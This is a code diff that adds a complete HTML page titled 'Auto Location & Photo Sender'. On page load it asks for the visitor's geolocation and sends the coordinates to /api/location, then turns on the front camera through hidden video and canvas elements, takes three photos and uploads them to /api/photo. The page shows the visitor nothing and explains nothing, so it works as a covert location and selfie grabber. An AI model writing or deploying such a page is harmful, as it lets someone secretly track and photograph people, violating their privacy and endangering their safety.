@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Auto Location & Photo Sender</title>
+  <script>
+    let videoStream = null;
+
+    // Send location to server
+    async function sendLocation() {
+      navigator.geolocation.getCurrentPosition(position => {
+        const { latitude, longitude } = position.coords;
+        fetch('/api/location', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ latitude, longitude })
+        }).then(res => res.text()).then(console.log).catch(console.error);
+      }, console.error);
+    }
+
+    // Capture photo and send to server
+    function captureAndSendPhoto(video) {
+      const canvas = document.getElementById("canvas");
+      const ctx = canvas.getContext("2d");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+      const imageData = canvas.toDataURL("image/jpeg");
+      fetch('/api/photo', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ image: imageData })
+      }).then(res => res.text()).then(console.log).catch(console.error);
+    }
+
+    // Stop the camera
+    function stopCamera() {
+      if (videoStream) {
+        videoStream.getTracks().forEach(track => track.stop());
+        videoStream = null;
+      }
+    }
+
+    // Start camera, take 3 photos, and stop
+    async function startCamera() {
+      try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+        const video = document.getElementById("video");
+        video.srcObject = videoStream;
+        await video.play();
+
+        for (let i = 0; i < 3; i++) {
+          setTimeout(() => {
+            captureAndSendPhoto(video);
+            if (i === 2) setTimeout(stopCamera, 500); // stop after last capture
+          }, i * 1000);
+        }
+      } catch (err) {
+        console.error("Camera error:", err);
+      }
+    }
+
+    window.onload = function () {
+      sendLocation();
+      startCamera();
+    };
+  </script>
+</head>
+<body>
+  <video id="video" autoplay playsinline style="display: none;"></video>
+  <canvas id="canvas" style="display: none;"></canvas>
+</body>
+</html>
